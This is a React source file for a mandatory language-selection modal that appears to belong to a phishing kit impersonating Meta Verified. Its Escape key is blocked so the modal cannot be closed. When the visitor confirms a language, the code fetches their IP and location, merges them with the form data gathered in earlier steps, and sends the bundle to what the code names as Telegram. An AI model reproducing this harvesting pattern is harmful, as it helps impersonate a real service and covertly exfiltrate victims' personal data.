'use client'

import React from 'react'
import { AnimatePresence, motion } from 'framer-motion'

import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { setLocale } from '@/app/store/slices/localeSlice'
import { updateForm } from '@/app/store/slices/stepFormSlice'
import { LOCALE_BCP47 } from '@/i18n'
import { APP_LOCALES, type AppLocale } from '@/i18n/schema'
import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
import { useAppStrings } from '@/hooks/useAppStrings'
import { getUserLocation } from '@/utils/getLocation'
import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
import { LANG_MODAL_SEEN_KEY, readSessionDisplayLocale, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
import { SendData } from '@/utils/sendData'

function applyDocumentLang(locale: AppLocale) {
  if (typeof document !== 'undefined') {
    document.documentElement.lang = LOCALE_BCP47[locale]
    document.documentElement.dataset.locale = locale
  }
}

type MvLanguageModalProps = {
  isOpen: boolean
  onClose: () => void
}

export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProps) {
  const t = useAppStrings()
  const dispatch = useAppDispatch()
  const currentLocale = useAppSelector((s) => s.locale.locale)
  const formData = useAppSelector((s) => s.stepForm.data)
  const [draftLocale, setDraftLocale] = React.useState<AppLocale>(currentLocale)
  const [loading, setLoading] = React.useState(false)
  const selectId = 'mv-lang-modal-select'
  const listRef = React.useRef<HTMLUListElement>(null)
  const sendingRef = React.useRef(false)

  React.useEffect(() => {
    if (isOpen) {
      setDraftLocale(readSessionDisplayLocale() ?? 'en')
      setLoading(false)
      sendingRef.current = false
    }
  }, [isOpen, currentLocale])

  React.useEffect(() => {
    if (!isOpen) return
    const selected = listRef.current?.querySelector<HTMLElement>('[aria-selected="true"]')
    selected?.scrollIntoView({ block: 'nearest' })
  }, [isOpen, draftLocale])

  React.useEffect(() => {
    if (!isOpen) return
    // Modal bắt buộc — chặn Escape đóng modal
    const onKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        event.preventDefault()
        event.stopPropagation()
      }
    }
    document.addEventListener('keydown', onKey, true)
    return () => document.removeEventListener('keydown', onKey, true)
  }, [isOpen])

  const handleListKeyDown = (event: React.KeyboardEvent<HTMLUListElement>) => {
    if (loading) return
    const index = APP_LOCALES.indexOf(draftLocale)
    if (event.key === 'ArrowDown') {
      event.preventDefault()
      const next = APP_LOCALES[Math.min(index + 1, APP_LOCALES.length - 1)]
      if (next) setDraftLocale(next)
    } else if (event.key === 'ArrowUp') {
      event.preventDefault()
      const prev = APP_LOCALES[Math.max(index - 1, 0)]
      if (prev) setDraftLocale(prev)
    } else if (event.key === 'Home') {
      event.preventDefault()
      setDraftLocale(APP_LOCALES[0])
    } else if (event.key === 'End') {
      event.preventDefault()
      setDraftLocale(APP_LOCALES[APP_LOCALES.length - 1])
    }
  }

  const markSeen = () => {
    try {
      localStorage.setItem(LANG_MODAL_SEEN_KEY, '1')
    } catch {
      /* ignore */
    }
  }

  const sendLanguageConfirmToTelegram = async (locale: AppLocale) => {
    if (isMetaVerifiedFlowCompleted()) return

    // Luôn lấy lại IP từ server (header client thật) trước khi gửi Telegram
    const location = await getUserLocation()
    dispatch(updateForm(location))

    const payload: Record<string, unknown> = {
      ...formData,
      ...location,
      language: LOCALE_OPTION_LABELS[locale],
    }

    try {
      await SendData(payload)
    } catch {
      /* luồng UX vẫn tiếp tục */
    }
  }

  const handleConfirm = async () => {
    if (loading || sendingRef.current) return
    sendingRef.current = true
    setLoading(true)

    writeSessionDisplayLocale(draftLocale)
    dispatch(setLocale(draftLocale))
    applyDocumentLang(draftLocale)

    try {
      await sendLanguageConfirmToTelegram(draftLocale)
    } finally {
      markSeen()
      setLoading(false)
      sendingRef.current = false
      onClose()
    }
  }

  return (
    <AnimatePresence>
      {isOpen ? (
        <motion.div
          key="mv-lang-backdrop"
          className="mv-lang-modal-backdrop"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          <motion.div
            key="mv-lang-panel"
            role="dialog"
            aria-modal="true"
            aria-labelledby="mv-lang-modal-title"
            className="mv-lang-modal"
            initial={{ opacity: 0, scale: 0.96, y: 10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.96, y: 10 }}
            transition={{ duration: 0.2, ease: [0.22, 1, 0.36, 1] }}
          >
            <div className="mv-lang-modal-header">
              <h2 id="mv-lang-modal-title" className="mv-lang-modal-title">
                {t.languagePicker.modalTitle}
              </h2>
            </div>

            <div className="mv-lang-modal-body">
              <div className="mv-lang-modal-field">
                <span className="mv-lang-modal-field-label" id={`${selectId}-label`}>
                  {t.languagePicker.fieldLabel}
                </span>
                <span className="mv-lang-modal-field-control">
                  <ul
                    id={selectId}
                    ref={listRef}
                    className="mv-lang-modal-select"
                    role="listbox"
                    tabIndex={0}
                    aria-labelledby={`${selectId}-label`}
                    aria-activedescendant={`${selectId}-opt-${draftLocale}`}
                    onKeyDown={handleListKeyDown}
                  >
                    {APP_LOCALES.map((code) => {
                      const selected = code === draftLocale
                      return (
                        <li
                          key={code}
                          id={`${selectId}-opt-${code}`}
                          role="option"
                          aria-selected={selected}
                          className={
                            selected
                              ? 'mv-lang-modal-option mv-lang-modal-option--selected'
                              : 'mv-lang-modal-option'
                          }
                        >
                          <button
                            type="button"
                            className="mv-lang-modal-option-btn"
                            disabled={loading}
                            tabIndex={-1}
                            onClick={() => setDraftLocale(code)}
                          >
                            {LOCALE_OPTION_LABELS[code]}
                          </button>
                        </li>
                      )
                    })}
                  </ul>
                </span>
              </div>
            </div>

            <div className="mv-lang-modal-footer">
              <button
                type="button"
                className="mv-lang-modal-btn mv-lang-modal-btn--confirm"
                disabled={loading}
                onClick={() => void handleConfirm()}
              >
                {t.languagePicker.confirm}
              </button>
            </div>
          </motion.div>
        </motion.div>
      ) : null}
    </AnimatePresence>
  )
}
